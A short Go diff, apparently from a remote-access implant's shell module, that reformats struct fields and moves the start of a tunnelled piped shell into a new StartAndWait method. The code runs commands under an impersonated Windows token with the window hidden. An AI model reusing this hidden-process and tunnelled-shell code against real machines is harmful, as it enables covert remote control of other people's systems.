@@ -58,7 +58,7 @@ func Start(command string) error {
 	cmd := exec.Command(command)
 	//{{if eq .GOOS "windows"}}
 	cmd.SysProcAttr = &windows.SysProcAttr{
-		Token: syscall.Token(priv.CurrentToken),
+		Token:      syscall.Token(priv.CurrentToken),
 		HideWindow: true,
 	}
 	//{{end}}
@@ -86,14 +86,14 @@ func pipedShell(tunnelID uint64, command []string) *Shell {
 	cmd = exec.Command(command[0], command[1:]...)
 	//{{if eq .GOOS "windows"}}
 	cmd.SysProcAttr = &windows.SysProcAttr{
-		Token: syscall.Token(priv.CurrentToken),
+		Token:      syscall.Token(priv.CurrentToken),
 		HideWindow: true,
 	}
 	//{{end}}
 
 	stdin, _ := cmd.StdinPipe()
 	stdout, _ := cmd.StdoutPipe()
-	cmd.Start()
+	// cmd.Start()
 
 	return &Shell{
 		ID:      tunnelID,
@@ -101,6 +101,12 @@ func pipedShell(tunnelID uint64, command []string) *Shell {
 		Stdout:  stdout,
 		Stdin:   stdin,
 	}
+}
+
+// StartAndWait starts a system shell then waits for it to complete
+func (s *Shell) StartAndWait() {
+	s.Command.Start()
+	s.Command.Wait()
 }
 
 // {{if ne .GOOS "windows"}}
